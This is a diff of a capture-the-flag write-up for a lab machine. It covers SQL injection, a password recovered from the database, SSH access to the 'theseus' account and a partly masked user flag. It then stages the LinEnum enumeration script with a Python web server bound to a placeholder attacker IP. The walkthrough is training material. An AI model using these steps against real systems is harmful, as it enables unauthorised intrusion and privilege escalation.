@@ -107,7 +107,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 <p>Now we can officially say that we have <strong>SQL Injection</strong> attack.</p>
 
-<h1 id="sqli--more-enumeratation">Sqli &amp; More Enumeratation</h1>
+<h1 id="initial-foothold-sqli--bypass-file-upload-restriction">Initial Foothold, Sqli &amp; Bypass File Upload Restriction</h1>
 
 <p>lets grab the login HTTP request from <strong>Repeater</strong> in <strong>Burp Suite</strong> and save to a file.</p>
 
@@ -206,6 +206,7 @@ Table: USER_PRIVILEGES
 </code></pre>
 <p>cool, it looks like we have some creds here and a username of the host.</p>
 
+<h1 id="getting-a-shell--user-own">Getting a Shell &amp; User Own</h1>
 <p>trying ssh to the box</p>
 
 <div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">The authenticity of host '10.10.10.185 (10.10.10.185)' cant be established.
@@ -241,8 +242,22 @@ theseus@10.10.10.185: Permission denied (publickey).
 
 <p>and supply ‘theseus’ the password that was found in the database ‘Th3s3usW4sK1ng’</p>
 
-<p>solid, now we have compromised theseus account. lets run linux enumeration scripts like <a href="https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh">LinEnum.sh</a></p>
+<p>solid, now we have compromised theseus account.</p>
 
+<p>user.txt</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>theseus@ubuntu:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
+<span class="nb">cat </span>user.txt
+<span class="k">*******************</span>3c1e26c2b91776
+</code></pre></div></div>
+
+<h1 id="post-exploitation--root-own">Post Exploitation &amp; Root Own</h1>
+
+<p>lets run linux enumeration scripts like <a href="https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh">LinEnum.sh</a></p>
+
+<p>downlowd the script and run</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="p">.</span><span class="n">server</span> <span class="mi">80</span> <span class="o">--</span><span class="n">bind</span> <span class="n">ATTACKER</span> <span class="n">IP</span>
+</code></pre></div></div>
 
 </div>
 
